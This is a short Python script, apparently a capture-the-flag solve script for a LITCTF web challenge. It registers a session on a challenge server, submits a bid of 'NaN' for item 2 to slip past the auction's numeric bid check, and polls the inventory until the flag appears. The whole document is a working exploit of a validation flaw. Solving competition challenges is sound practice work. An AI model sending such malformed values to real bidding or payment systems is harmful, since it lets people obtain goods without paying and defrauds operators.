import time
import requests

HOST = "http://34.44.129.8:57316"

s = requests.Session()

print("[*] Registering new user...")
s.get(f"{HOST}/register")

print("[*] Sending NaN bid for item 2 (flag)...")
s.post(f"{HOST}/bid", data={"item_id": "2", "bid": "NaN"})

print("[*] Polling inventory until flag appears...")
while True:
    resp = s.get(f"{HOST}/inventory")
    if "LITCTF{" in resp.text:
        print("[+] FLAG FOUND!")
        print(resp.text)
        break
    else:
        time.sleep(5)
